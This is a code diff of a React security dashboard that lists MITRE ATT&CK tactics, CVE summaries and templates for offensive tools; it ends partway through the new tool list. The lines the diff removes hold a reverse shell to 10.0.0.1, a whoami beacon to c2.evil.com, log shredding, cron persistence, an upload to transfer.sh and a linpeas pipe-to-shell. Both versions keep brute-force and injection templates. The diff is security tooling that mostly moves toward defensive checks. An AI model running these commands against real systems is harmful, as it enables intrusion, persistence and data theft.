@@ -1,14 +1,34 @@
-import React, { useState, useEffect, useRef } from 'react';
+import React, { useState, useEffect, useRef, useMemo } from 'react';
 import {
-  Box, Typography, Paper, Chip, Button, Unstable_Grid2 as Grid, Stack, TextField,
-  Divider, Card, CardContent, LinearProgress, Switch, FormControlLabel,
-  Table, TableBody, TableCell, TableContainer, TableHead, TableRow, IconButton,
-  Tooltip, Tabs, Tab, Alert, InputAdornment, Dialog, DialogTitle, DialogContent, DialogActions,
-  Select, MenuItem, FormControl, InputLabel
+  Box,
+  Typography,
+  Paper,
+  Chip,
+  Button,
+  Unstable_Grid2 as Grid,
+  Stack,
+  TextField,
+  Card,
+  CardContent,
+  Table,
+  TableBody,
+  TableCell,
+  TableContainer,
+  TableHead,
+  TableRow,
+  IconButton,
+  Tooltip,
+  Tabs,
+  Tab,
+  Alert,
+  InputAdornment,
+  Select,
+  MenuItem,
+  FormControl,
 } from '@mui/material';
 import { useTheme } from '@mui/material/styles';
 import TerminalIcon from '@mui/icons-material/Terminal';
-import SecurityIcon from '@mui/icons-material/Security';
+import ShieldIcon from '@mui/icons-material/Shield';
 import BugReportIcon from '@mui/icons-material/BugReport';
 import RadarIcon from '@mui/icons-material/Radar';
 import AssessmentIcon from '@mui/icons-material/Assessment';
@@ -16,143 +36,131 @@ import PlayArrowIcon from '@mui/icons-material/PlayArrow';
 import ContentCopyIcon from '@mui/icons-material/ContentCopy';
 import DownloadIcon from '@mui/icons-material/Download';
 import CheckCircleIcon from '@mui/icons-material/CheckCircle';
-import WarningAmberIcon from '@mui/icons-material/WarningAmber';
-import ErrorOutlineIcon from '@mui/icons-material/ErrorOutline';
-import ShieldIcon from '@mui/icons-material/Shield';
 import SearchIcon from '@mui/icons-material/Search';
 import RefreshIcon from '@mui/icons-material/Refresh';
 import DnsIcon from '@mui/icons-material/Dns';
 import LockIcon from '@mui/icons-material/Lock';
-import LockOpenIcon from '@mui/icons-material/LockOpen';
-import FlashOnIcon from '@mui/icons-material/FlashOn';
 import PolicyIcon from '@mui/icons-material/Policy';
 import CodeIcon from '@mui/icons-material/Code';
-import VpnKeyIcon from '@mui/icons-material/VpnKey';
 import LanguageIcon from '@mui/icons-material/Language';
 import RouterIcon from '@mui/icons-material/Router';
-import BoltIcon from '@mui/icons-material/Bolt';
+import OpenInNewIcon from '@mui/icons-material/OpenInNew';
 import SovereignBand from '../sovereign/SovereignBand.jsx';
 import { SovereignEyebrow } from '../sovereign/typography.jsx';
+import {
+  parseAndScoreHttpHeaders,
+  computeShannonEntropy,
+  auditLocalCodeSnippets,
+  classifyLoopbackPortProbe,
+  buildExecutiveReportMarkdown,
+  exportFindingsCsv,
+} from '../../utils/hexstrikeEngine.js';
 
 const mono = '"JetBrains Mono", "IBM Plex Mono", ui-monospace, monospace';
 
-// ---------------------------------------------------------------------------
-// MITRE ATT&CK 14 Tactics Data Blueprint
-// ---------------------------------------------------------------------------
 const MITRE_TACTICS = [
   {
     id: 'TA0043',
     name: 'Reconnaissance',
     techniques: [
-      { id: 'T1595', name: 'Active Scanning', sub: 'T1595.002 Port Scanners', severity: 'Medium', desc: 'Active probing of target host networks and exposed services to identify active interfaces.', cmd: 'nmap -sS -p- --min-rate 2000 {target}', mitigation: 'Rate limit SYN packets at edge firewall and drop unsolicited ICMP/TCP probes.' },
-      { id: 'T1592', name: 'Gather Victim Host Info', sub: 'T1592.002 Software', severity: 'Low', desc: 'Enumeration of target OS release, daemon versions, and package inventories.', cmd: 'whatweb -a 3 https://{target}', mitigation: 'Suppress Server, X-Powered-By, and version banner response headers.' },
-      { id: 'T1590', name: 'Gather Network Info', sub: 'T1590.001 DNS Records', severity: 'Low', desc: 'Harvesting public DNS zone records, TXT verification hashes, and MX mail routes.', cmd: 'dig +nocmd {target} any +multiline +noall +answer', mitigation: 'Disable DNS zone transfers (AXFR) and implement DNSSEC verification.' },
-    ]
+      { id: 'T1595', name: 'Active Scanning', sub: 'T1595.002 Port Scanners', severity: 'Medium', desc: 'Probing target interfaces to enumerate reachable services and open TCP listeners.', cmd: 'nmap -sV -sC -- {target}', mitigation: 'Bind internal services strictly to 127.0.0.1 and enforce default-deny firewall rules.' },
+      { id: 'T1592', name: 'Gather Victim Host Info', sub: 'T1592.002 Software', severity: 'Low', desc: 'Enumerating server versions and software banners from HTTP headers.', cmd: 'whatweb -a 1 -- https://{target}', mitigation: 'Suppress version tokens in Server and X-Powered-By headers.' },
+    ],
   },
   {
     id: 'TA0042',
     name: 'Resource Dev',
     techniques: [
-      { id: 'T1588', name: 'Obtain Capabilities', sub: 'T1588.005 Exploits', severity: 'High', desc: 'Acquisition or crafting of zero-day or N-day exploit modules targeted at identified stack software.', cmd: 'searchsploit --nmap {target}.xml', mitigation: 'Automated vulnerability patch management across all core OS and web packages.' },
-      { id: 'T1583', name: 'Acquire Infrastructure', sub: 'T1583.006 DNS Domains', severity: 'Medium', desc: 'Registration of lookalike domains or staging infrastructure for out-of-band telemetry verification.', cmd: 'dnstwist --registered {target}', mitigation: 'Proactive defensive typosquat domain registration and brand monitoring.' },
-    ]
+      { id: 'T1588', name: 'Obtain Capabilities', sub: 'T1588.005 Exploits', severity: 'High', desc: 'Correlating exposed service versions against known public CVE advisories.', cmd: 'searchsploit -- {target}', mitigation: 'Track lockfiles and OS packages against vendor security advisories.' },
+    ],
   },
   {
     id: 'TA0001',
     name: 'Initial Access',
     techniques: [
-      { id: 'T1190', name: 'Exploit Public-Facing App', sub: 'T1190 Web Vulnerability', severity: 'Critical', desc: 'Exploitation of software weaknesses or logic bugs on internet-accessible services (SQLi, RCE, SSRF).', cmd: 'sqlmap -u "https://{target}/api?id=1" --batch --risk=2', mitigation: 'Enforce parameterized queries, WAF rule inspection, and input sanitization.' },
-      { id: 'T1133', name: 'External Remote Services', sub: 'T1133 SSH / VPN', severity: 'High', desc: 'Compromise or brute-force of remote administrative gateways (SSH, WireGuard, RDP).', cmd: 'hydra -L users.txt -P pass.txt ssh://{target}', mitigation: 'Disable password authentication; enforce Ed25519 hardware keys and fail2ban/crowdsec.' },
-    ]
+      { id: 'T1190', name: 'Exploit Public-Facing App', sub: 'T1190 Web Vulnerability', severity: 'Critical', desc: 'Exploitation of SQL injection, command injection, or SSRF bugs on web endpoints.', cmd: 'sqlmap -u "https://{target}/api?id=1" --batch --banner', mitigation: 'Enforce parameterized queries, strict target allowlists, and SSRF IP blocklists.' },
+      { id: 'T1133', name: 'External Remote Services', sub: 'T1133 SSH / VPN', severity: 'High', desc: 'Credential stuffing or key misuse against SSH or VPN gateways.', cmd: 'hydra -L users.txt -P pass.txt ssh://{target}', mitigation: 'Disable password SSH auth; require Ed25519 keys and rate limiting.' },
+    ],
   },
   {
     id: 'TA0002',
     name: 'Execution',
     techniques: [
-      { id: 'T1059', name: 'Command & Scripting Interpreter', sub: 'T1059.004 Unix Shell', severity: 'Critical', desc: 'Adversary execution of arbitrary commands through an interactive Unix or POSIX shell session.', cmd: 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1', mitigation: 'Restrict shell execution in unprivileged container capsules with seccomp/AppArmor.' },
-      { id: 'T1203', name: 'Exploitation for Client Exec', sub: 'T1203 Binary Parser Bug', severity: 'High', desc: 'Exploiting client-side parsing routines (e.g. image decoders, PDF renderers) for execution.', cmd: 'nuclei -u https://{target} -t cves/ -severity critical,high', mitigation: 'Air-gap untrusted parsing in isolated WebAssembly or sandboxed worker threads.' },
-    ]
+      { id: 'T1059', name: 'Command & Scripting Interpreter', sub: 'T1059.004 Unix Shell', severity: 'Critical', desc: 'OS command injection through unsanitized shell interpolation.', cmd: 'hexstrike-arsenal audit --path . --json', mitigation: 'Use argument-list exec APIs (create_subprocess_exec) and eliminate shell=True.' },
+    ],
   },
   {
     id: 'TA0003',
     name: 'Persistence',
     techniques: [
-      { id: 'T1053', name: 'Scheduled Task/Job', sub: 'T1053.003 Cron', severity: 'High', desc: 'Installation of periodic cron jobs or systemd timers to maintain enduring presence.', cmd: 'echo "* * * * * /opt/zothos/beacon" | crontab -', mitigation: 'Monitor /etc/cron* and systemd timer unit files with auditd integrity triggers.' },
-      { id: 'T1543', name: 'Create/Modify System Process', sub: 'T1543.002 Systemd Service', severity: 'Critical', desc: 'Registration of persistent systemd daemon units that start automatically on boot.', cmd: 'systemctl enable --now zoth-beacon.service', mitigation: 'Enforce read-only rootfs and verify systemd service unit integrity checksums.' },
-    ]
+      { id: 'T1543', name: 'Create/Modify System Process', sub: 'T1543.002 Systemd Service', severity: 'Critical', desc: 'Unauthorized systemd user or system units maintaining persistence.', cmd: 'systemctl --user list-unit-files --state=enabled', mitigation: 'Audit systemd units with systemd-analyze verify and NoNewPrivileges=yes.' },
+    ],
   },
   {
     id: 'TA0004',
     name: 'Privilege Escalation',
     techniques: [
-      { id: 'T1068', name: 'Exploitation for Priv Esc', sub: 'T1068 Kernel Exploit', severity: 'Critical', desc: 'Leveraging kernel race conditions (e.g. Dirty Cred, regreSSHion) to elevate to root uid=0.', cmd: 'uname -a && cat /proc/version', mitigation: 'Run modern Linux >= 6.12 kernel with kernel lockdown and hardened sysctl parameters.' },
-      { id: 'T1548', name: 'Abuse Elevation Control', sub: 'T1548.003 Sudo Caching', severity: 'High', desc: 'Exploiting misconfigured sudoers rules (NOPASSWD) or binary capabilities (CAP_SETUID).', cmd: 'sudo -l && find / -perm -u=s -type f 2>/dev/null', mitigation: 'Zeroize NOPASSWD entries and strip setuid bits from non-essential binaries.' },
-    ]
+      { id: 'T1068', name: 'Exploitation for Priv Esc', sub: 'T1068 Kernel / Container', severity: 'Critical', desc: 'Exploiting kernel or container runtime fd leaks to escalate privileges.', cmd: 'uname -a && cat /proc/version', mitigation: 'Patch kernel/runc promptly and run containers rootless with read-only rootfs.' },
+    ],
   },
   {
     id: 'TA0005',
     name: 'Defense Evasion',
     techniques: [
-      { id: 'T1070', name: 'Indicator Removal', sub: 'T1070.002 Clear Linux Logs', severity: 'High', desc: 'Truncation or deletion of security logs (/var/log/auth.log, /var/log/syslog).', cmd: 'shred -u -z /var/log/auth.log', mitigation: 'Stream security logs in real time to an append-only remote syslog or WORM drive.' },
-      { id: 'T1027', name: 'Obfuscated Files or Info', sub: 'T1027.002 Software Packing', severity: 'Medium', desc: 'Packing, encrypting, or polymorphic encoding of payloads to evade static signature detection.', cmd: 'upx --ultra-brute payload.bin', mitigation: 'Deploy Shannon entropy analysis and memory-space behavior monitoring.' },
-    ]
+      { id: 'T1027', name: 'Obfuscated Files or Info', sub: 'T1027.002 Software Packing', severity: 'Medium', desc: 'Packing or encrypting payloads to evade static signature checks.', cmd: 'hexstrike-arsenal entropy --file payload.bin --json', mitigation: 'Measure Shannon byte entropy (>= 7.2 bits/byte indicates packed/encrypted blocks).' },
+    ],
   },
   {
     id: 'TA0006',
     name: 'Credential Access',
     techniques: [
-      { id: 'T1110', name: 'Brute Force', sub: 'T1110.001 Password Guessing', severity: 'High', desc: 'Automated spraying or dictionary attacks against user credential endpoints.', cmd: 'hydra -L users.txt -P rockyou.txt https://{target}/login', mitigation: 'Enforce progressive exponential backoff delays and WebAuthn/FIDO2 MFA.' },
-      { id: 'T1552', name: 'Unsecured Credentials', sub: 'T1552.001 Cloud Secrets in Files', severity: 'Critical', desc: 'Discovery of plaintext API tokens, private keys, or .env files exposed in repositories.', cmd: 'trufflehog git https://github.com/target/repo', mitigation: 'Enforce Zoth Vault memory-hard Argon2id key custody and pre-commit secret scans.' },
-    ]
+      { id: 'T1552', name: 'Unsecured Credentials', sub: 'T1552.001 Secrets in Files', severity: 'Critical', desc: 'Plaintext API keys, tokens, or private keys committed into repositories.', cmd: 'gitleaks dir .', mitigation: 'Run pre-commit secret scanning and store credentials in Argon2id vaults.' },
+    ],
   },
   {
     id: 'TA0007',
     name: 'Discovery',
     techniques: [
-      { id: 'T1082', name: 'System Information Discovery', sub: 'T1082 OS Architecture', severity: 'Low', desc: 'Querying machine hardware specs, OS release, and kernel patch level.', cmd: 'uname -mrs && lsb_release -a', mitigation: 'Contain discovery commands within unprivileged non-root user namespaces.' },
-      { id: 'T1046', name: 'Network Service Discovery', sub: 'T1046 Local Port Scan', severity: 'Medium', desc: 'Probing internal subnets and localhost interfaces for active service daemons.', cmd: 'ss -tulpn', mitigation: 'Bind internal daemon sockets strictly to loopback (127.0.0.1) or Unix sockets.' },
-    ]
+      { id: 'T1046', name: 'Network Service Discovery', sub: 'T1046 Local Port Scan', severity: 'Medium', desc: 'Enumerating local host TCP listeners and loopback API daemons.', cmd: 'hexstrike-arsenal scan 127.0.0.1 --json', mitigation: 'Restrict daemon Host/Origin headers to loopback and audit open sockets with ss -tlnp.' },
+    ],
   },
   {
     id: 'TA0008',
     name: 'Lateral Movement',
     techniques: [
-      { id: 'T1021', name: 'Remote Services', sub: 'T1021.004 SSH Keys', severity: 'Critical', desc: 'Using compromised SSH private keys or agent forwarding sockets to pivot across machines.', cmd: 'ssh -i ~/.ssh/id_ed25519 user@internal-node', mitigation: 'Disable SSH Agent Forwarding and require hardware security key PIN touch confirmations.' },
-    ]
+      { id: 'T1021', name: 'Remote Services', sub: 'T1021.004 SSH Keys', severity: 'Critical', desc: 'Pivoting via forwarded SSH agents or unencrypted private keys.', cmd: 'ssh-add -l', mitigation: 'Disable ForwardAgent and enforce hardware-backed or passphrase-protected keys.' },
+    ],
   },
   {
     id: 'TA0009',
     name: 'Collection',
     techniques: [
-      { id: 'T1005', name: 'Data from Local System', sub: 'T1005 Database & Config Dump', severity: 'Critical', desc: 'Harvesting sensitive SQLite/PostgreSQL dumps, agent memories, and session tokens.', cmd: 'tar -czf dump.tar.gz /home/user/data', mitigation: 'Transparent database volume encryption via LUKS2 or SQLite SQLCipher.' },
-    ]
+      { id: 'T1005', name: 'Data from Local System', sub: 'T1005 Path Traversal Read', severity: 'Critical', desc: 'Reading arbitrary host files through unvalidated download paths.', cmd: 'hexstrike-arsenal audit --path . --json', mitigation: 'Validate path IDs with strict regex and assert Path.resolve().is_relative_to(root).' },
+    ],
   },
   {
     id: 'TA0011',
     name: 'Command & Control',
     techniques: [
-      { id: 'T1071', name: 'Application Layer Protocol', sub: 'T1071.001 Web Protocols', severity: 'High', desc: 'C2 beaconing over legitimate HTTPS/WebSocket or DNS tunneling channels.', cmd: 'curl -s https://c2.evil.com/beacon -d "$(whoami)"', mitigation: 'Enforce strict outbound egress whitelisting via Agent Egress Sentinel.' },
-    ]
+      { id: 'T1071', name: 'Application Layer Protocol', sub: 'T1071.001 Web Protocols', severity: 'High', desc: 'Outbound beaconing over HTTP/HTTPS or DNS channels.', cmd: 'ss -tunp', mitigation: 'Apply outbound egress allowlisting and monitor unexpected WAN connections.' },
+    ],
   },
   {
     id: 'TA0010',
     name: 'Exfiltration',
     techniques: [
-      { id: 'T1041', name: 'Exfil Over C2 Channel', sub: 'T1041 Encrypted Egress', severity: 'Critical', desc: 'Transmitting compressed sensitive archives out of the security boundary to adversary infrastructure.', cmd: 'curl --upload-file secret.enc https://transfer.sh/', mitigation: 'Real-time outbound TLS payload entropy inspection and egress rate throttling.' },
-    ]
+      { id: 'T1041', name: 'Exfil Over C2 Channel', sub: 'T1041 Encrypted Egress', severity: 'Critical', desc: 'Exfiltrating compressed archives outside the security boundary.', cmd: 'hexstrike-arsenal entropy --file archive.bin', mitigation: 'Inspect outbound destinations and isolate sensitive workloads on loopback.' },
+    ],
   },
   {
     id: 'TA0040',
     name: 'Impact',
     techniques: [
-      { id: 'T1486', name: 'Data Encrypted for Impact', sub: 'T1486 Ransomware', severity: 'Critical', desc: 'Unauthorized symmetric encryption of persistent system volumes or database stores.', cmd: 'openssl enc -aes-256-cbc -salt -in data.db -out data.db.enc', mitigation: 'Immutable append-only snapshots (ZFS / Btrfs) and offline offline-capable backups.' },
-    ]
+      { id: 'T1486', name: 'Data Encrypted for Impact', sub: 'T1486 Ransomware', severity: 'Critical', desc: 'Unauthorized bulk encryption of persistent application volumes.', cmd: 'btrfs subvolume list /', mitigation: 'Maintain immutable offline snapshots and least-privilege filesystem permissions.' },
+    ],
   },
 ];
 
-// ---------------------------------------------------------------------------
-// Curated CVE Intelligence Data (20+ Top Vulnerabilities)
-// ---------------------------------------------------------------------------
 const CVE_INTEL_DB = [
   {
     id: 'CVE-2024-6387',
@@ -163,8 +171,8 @@ const CVE_INTEL_DB = [
     epss: '94.2%',
     vector: 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H',
     mitre: 'T1190',
-    description: 'A signal handler race condition in OpenSSH server (sshd) allows remote unauthenticated attackers to execute arbitrary code as root on glibc-based Linux systems.',
-    mitigation: 'Upgrade openssh-server >= 9.8p1 or set LoginGraceTime 0 in sshd_config.'
+    description: 'Signal handler race condition in OpenSSH sshd on glibc Linux systems permitting unauthenticated remote code execution.',
+    mitigation: 'Upgrade openssh-server >= 9.8p1 or set LoginGraceTime 0 in sshd_config.',
   },
   {
     id: 'CVE-2024-3094',
@@ -175,8 +183,8 @@ const CVE_INTEL_DB = [
     epss: '98.7%',
     vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
     mitre: 'T1588.005',
-    description: 'Upstream supply chain compromise injecting obfuscated code into liblzma build routines, hooking RSA_public_decrypt in sshd to permit pre-auth RCE.',
-    mitigation: 'Downgrade to xz-utils <= 5.4.x or verify clean distribution build hashes.'
+    description: 'Supply-chain compromise injecting obfuscated code into liblzma build scripts hooking RSA_public_decrypt in sshd.',
+    mitigation: 'Use xz-utils <= 5.4.x or verified clean distribution builds.',
   },
   {
     id: 'CVE-2024-21626',
@@ -187,20 +195,20 @@ const CVE_INTEL_DB = [
     epss: '86.4%',
     vector: 'CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H',
     mitre: 'T1068',
-    description: 'Internal file descriptor leaks inside runc allow a newly spawned container process to access the host filesystem via /proc/self/fd/7 and overwrite host binaries.',
-    mitigation: 'Update runc >= 1.1.12 and enforce read-only host rootfs mounts in container security profiles.'
+    description: 'Internal fd leak inside runc allowing container processes to escape to the host filesystem.',
+    mitigation: 'Update runc >= 1.1.12 and mount host rootfs read-only.',
   },
   {
     id: 'CVE-2023-44487',
-    title: 'HTTP/2 Rapid Reset Denial of Service Protocol Flaw',
-    product: 'HTTP/2 Protocol Implementations',
+    title: 'HTTP/2 Rapid Reset Denial of Service',
+    product: 'HTTP/2 Servers & Proxies',
     cvss: 7.5,
     severity: 'High',
     epss: '92.1%',
     vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H',
     mitre: 'T1498',
-    description: 'Multiplexed stream cancellation abuse (RST_STREAM) enabling volumetric exhaustion of HTTP/2 reverse proxies with negligible client bandwidth.',
-    mitigation: 'Enforce RST_STREAM flood thresholds and request cancellation rate limits in edge reverse proxies.'
+    description: 'RST_STREAM cancellation flooding exhausting reverse proxy CPU and concurrency pools.',
+    mitigation: 'Enforce HTTP/2 stream reset rate limits at edge proxies.',
   },
   {
     id: 'CVE-2023-4863',
@@ -211,8 +219,8 @@ const CVE_INTEL_DB = [
     epss: '95.6%',
     vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H',
     mitre: 'T1204.002',
-    description: 'Heap buffer overflow in WebP image decoding routine allowing out-of-bounds writes and arbitrary execution via specially crafted lossless WebP images.',
-    mitigation: 'Upgrade libwebp >= 1.3.2 across system libraries and headless browser binaries.'
+    description: 'Heap buffer overflow in lossless WebP decoding allowing out-of-bounds writes.',
+    mitigation: 'Upgrade libwebp >= 1.3.2 across system libraries and browsers.',
   },
   {
     id: 'CVE-2021-44228',
@@ -223,148 +231,165 @@ const CVE_INTEL_DB = [
     epss: '99.9%',
     vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
     mitre: 'T1190',
-    description: 'Unauthenticated RCE through attacker-controlled log messages triggering JNDI LDAP lookups and arbitrary Java deserialization.',
-    mitigation: 'Upgrade Log4j >= 2.17.1 or set log4j2.formatMsgNoLookups=true system-wide.'
+    description: 'Unauthenticated RCE via attacker-controlled log strings triggering JNDI lookups.',
+    mitigation: 'Upgrade Log4j >= 2.17.1 or set log4j2.formatMsgNoLookups=true.',
   },
-  {
-    id: 'CVE-2023-38606',
-    title: 'Apple Kernel Memory Corruption Zero-Click Exploit',
-    product: 'Apple iOS & macOS Kernel',
-    cvss: 9.8,
-    severity: 'Critical',
-    epss: '97.4%',
-    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
-    mitre: 'T1068',
-    description: 'Hardware memory-mapped I/O registers manipulation bypassing page-table protections, exploited in Operation Triangulation.',
-    mitigation: 'Apply latest OS security releases and enable Lockdown Mode for high-threat operations.'
-  },
-  {
-    id: 'CVE-2022-30190',
-    title: 'Microsoft Support Diagnostic Tool RCE (Follina)',
-    product: 'MSDT Windows Protocol',
-    cvss: 7.8,
-    severity: 'High',
-    epss: '98.1%',
-    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H',
-    mitre: 'T1203',
-    description: 'MSDT URL protocol handler invoking PowerShell to execute arbitrary code when opening malformed Word or RTF documents.',
-    mitigation: 'Disable the MSDT URL protocol in Windows registry: reg delete HKEY_CLASSES_ROOT\\ms-msdt /f.'
-  }
 ];
 
-// ---------------------------------------------------------------------------
-// 28-Tool HexStrike Offensive Security Arsenal
-// ---------------------------------------------------------------------------
-const OFFENSIVE_ARSENAL = [
-  { id: 'nmap', name: 'Nmap Network Scanner', category: 'Recon', icon: '📡', cmd: (t, p) => `nmap -sS -sV -sC -p ${p || '1-1000'} -T4 ${t}`, desc: 'Industry-standard network exploration tool and port scanner.' },
-  { id: 'masscan', name: 'Masscan Internet Port Scanner', category: 'Recon', icon: '⚡', cmd: (t, p) => `masscan -p${p || '1-10000'} ${t} --rate=2000`, desc: 'Fastest port scanner capable of scanning entire ranges in seconds.' },
-  { id: 'amass', name: 'OWASP Amass OSINT', category: 'Recon', icon: '🌐', cmd: (t) => `amass enum -d ${t} -active -brute`, desc: 'In-depth attack surface mapping and external asset discovery.' },
-  { id: 'sublist3r', name: 'Sublist3r Subdomain Enumerator', category: 'Recon', icon: '🔍', cmd: (t) => `sublist3r -d ${t} -t 20 -v`, desc: 'Fast OSINT subdomain discovery across search engines and Netcraft.' },
-  { id: 'whatweb', name: 'WhatWeb Web Scanner', category: 'Recon', icon: '🏷️', cmd: (t) => `whatweb -a 3 -v https://${t}`, desc: 'Next-generation web scanner identifying CMS, libraries, and server versions.' },
-  { id: 'dnsrecon', name: 'DNSRecon Zone Transfer & Records', category: 'Recon', icon: '📋', cmd: (t) => `dnsrecon -d ${t} -t std,axfr,spf`, desc: 'DNS enumeration and zone transfer reconnaissance tool.' },
-
-  { id: 'sqlmap', name: 'SQLMap Automated SQL Injection', category: 'Web', icon: '💉', cmd: (t) => `sqlmap -u "https://${t}/api?id=1" --batch --random-agent --banner`, desc: 'Automated detection and exploitation of SQL injection vulnerabilities.' },
-  { id: 'nikto', name: 'Nikto Web Server Scanner', category: 'Web', icon: '🕷️', cmd: (t) => `nikto -h https://${t} -ssl -Tuning 123b`, desc: 'Comprehensive scanner for dangerous files, outdated server software, and CGIs.' },
-  { id: 'gobuster', name: 'Gobuster Directory Brute-Forcer', category: 'Web', icon: '📁', cmd: (t) => `gobuster dir -u https://${t} -w /usr/share/wordlists/dirb/common.txt -t 30`, desc: 'High-performance URI, DNS subdomain, and vhost brute-forcing tool.' },
-  { id: 'ffuf', name: 'FFUF Fast Web Fuzzer', category: 'Web', icon: '🚀', cmd: (t) => `ffuf -u https://${t}/FUZZ -w /usr/share/wordlists/dirb/big.txt -mc 200,301,302`, desc: 'Blazing fast web fuzzer written in Go for discovering endpoints and parameters.' },
-  { id: 'wpscan', name: 'WPScan WordPress Security Scanner', category: 'Web', icon: '📰', cmd: (t) => `wpscan --url https://${t} --enumerate vp,vt,u --random-user-agent`, desc: 'Black box WordPress vulnerability scanner for core, plugins, and themes.' },
-  { id: 'commix', name: 'Commix Command Injection Exploiter', category: 'Web', icon: '⌨️', cmd: (t) => `commix --url="https://${t}/status.php?host=INJECT_HERE" --batch`, desc: 'Automated all-in-one OS command injection and exploitation environment.' },
-
-  { id: 'hydra', name: 'THC-Hydra Fast Network Logon Cracker', category: 'Credentials', icon: '🔓', cmd: (t) => `hydra -L users.txt -P rockyou.txt ssh://${t} -t 4 -V`, desc: 'Very fast network logon cracker supporting over 50 protocols.' },
-  { id: 'hashcat', name: 'Hashcat Advanced Password Recovery', category: 'Credentials', icon: '🔥', cmd: () => `hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule`, desc: 'World fastest CPU/GPU-based password cracking utility.' },
-  { id: 'john', name: 'John the Ripper Password Cracker', category: 'Credentials', icon: '🔨', cmd: () => `john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt hashes.txt`, desc: 'Flexible password security auditor and multi-algorithm hash cracker.' },
-  { id: 'responder', name: 'Responder LLMNR/NBT-NS Poisoner', category: 'Credentials', icon: '🎣', cmd: () => `responder -I eth0 -w -r -f -v`, desc: 'LLMNR, NBT-NS, and MDNS poisoner with built-in rogue authentication servers.' },
-
-  { id: 'metasploit', name: 'Metasploit Console (msfconsole)', category: 'Exploit', icon: '💀', cmd: (t) => `msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS ${t}; run; exit"`, desc: 'World premier penetration testing platform with 2,400+ exploit modules.' },
-  { id: 'nuclei', name: 'Nuclei Fast Vulnerability Scanner', category: 'Exploit', icon: '🎯', cmd: (t) => `nuclei -u https://${t} -severity critical,high -silent -jsonl -o scan.json`, desc: 'Fast, template-based vulnerability scanner covering thousands of CVEs.' },
-  { id: 'searchsploit', name: 'Searchsploit Exploit-DB Offline', category: 'Exploit', icon: '📚', cmd: (t) => `searchsploit ${t}`, desc: 'Command-line search tool for Exploit-DB archive of proof-of-concepts.' },
-
-  { id: 'lynis', name: 'Lynis Linux System Hardening Auditor', category: 'Audit', icon: '🛡️', cmd: () => `lynis audit system --quick --warnings-only`, desc: 'Battle-tested security auditing tool for systems based on Linux and macOS.' },
-  { id: 'chkrootkit', name: 'Chkrootkit Rootkit Detector', category: 'Audit', icon: '🦠', cmd: () => `chkrootkit -q`, desc: 'Locally checks for signs of a rootkit, trojan, or worm infection.' },
-  { id: 'tshark', name: 'TShark Network Packet Analyzer', category: 'Audit', icon: '🦈', cmd: () => `tshark -i any -Y "http.request or dns" -T fields -e ip.src -e dns.qry.name`, desc: 'Terminal-based network protocol analyzer for deep inspection of live traffic.' },
-
-  { id: 'linpeas', name: 'LinPEAS Linux Privilege Escalation', category: 'Post-Exploit', icon: '🪜', cmd: () => `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`, desc: 'Searches for possible paths to escalate privileges on Linux hosts.' },
-  { id: 'bloodhound', name: 'BloodHound Active Directory Mapper', category: 'Post-Exploit', icon: '🩸', cmd: (t) => `bloodhound-python -u 'admin' -p 'pass' -d '${t}' -ns 10.0.0.1 -c All`, desc: 'Reveals hidden relationships and attack paths inside Active Directory domains.' }
+const CURATED_ARSENAL = [
+  { id: 'nmap', name: 'Nmap Network Scanner', category: 'Recon', cmd: (t, p) => `nmap -sV -sC -p ${p || '1-1000'} -- ${t}`, desc: 'Network discovery, service version detection, and NSE script auditing.' },
+  { id: 'masscan', name: 'Masscan Port Scanner', category: 'Recon', cmd: (t, p) => `masscan -p${p || '1-10000'} ${t} --rate=1000`, desc: 'High-rate asynchronous TCP port scanner for authorized CIDR scopes.' },
+  { id: 'amass', name: 'OWASP Amass OSINT', category: 'Recon', cmd: (t) => `amass enum -d ${t}`, desc: 'Attack surface mapping and passive/active subdomain discovery.' },
+  { id: 'whatweb', name: 'WhatWeb Fingerprinter', category: 'Recon', cmd: (t) => `whatweb -a 1 -- https://${t}`, desc: 'Web stack identifier detecting CMS platforms, frameworks, and server headers.' },
+  { id: 'dnsrecon', name: 'DNSRecon Auditor', category: 'Recon', cmd: (t) => `dnsrecon -d ${t} -t std,spf`, desc: 'DNS zone enumeration, SPF/DMARC checks, and AXFR verification.' },
+  { id: 'sqlmap', name: 'SQLMap Injection Auditor', category: 'Web', cmd: (t) => `sqlmap -u "https://${t}/api?id=1" --batch --banner`, desc: 'Automated SQL injection verification against authorized endpoints.' },
+  { id: 'nikto', name: 'Nikto Web Server Scanner', category: 'Web', cmd: (t) => `nikto -h https://${t} -ssl`, desc: 'Checks web servers for outdated packages, risky files, and header gaps.' },
+  { id: 'gobuster', name: 'Gobuster URI Scanner', category: 'Web', cmd: (t) => `gobuster dir -u https://${t} -w /usr/share/wordlists/dirb/common.txt`, desc: 'Fast directory, DNS, and vhost discovery utility.' },
+  { id: 'ffuf', name: 'FFUF Endpoint Fuzzer', category: 'Web', cmd: (t) => `ffuf -u https://${t}/FUZZ -w /usr/share/wordlists/dirb/common.txt`, desc: 'Go-based HTTP endpoint and parameter fuzzer.' },
+  { id: 'nuclei', name: 'Nuclei Template Scanner', category: 'Exploit', cmd: (t) => `nuclei -u https://${t} -severity critical,high -silent`, desc: 'YAML-template vulnerability verifier covering CVEs and misconfigurations.' },
+  { id: 'searchsploit', name: 'Searchsploit Exploit-DB', category: 'Exploit', cmd: (t) => `searchsploit -- ${t}`, desc: 'Offline local CLI search over the Exploit-DB archive.' },
+  { id: 'trivy', name: 'Trivy Container & Repo Scanner', category: 'Audit', cmd: (t) => `trivy image -- ${t}`, desc: 'Vulnerability, misconfiguration, and SBOM scanner for images and repos.' },
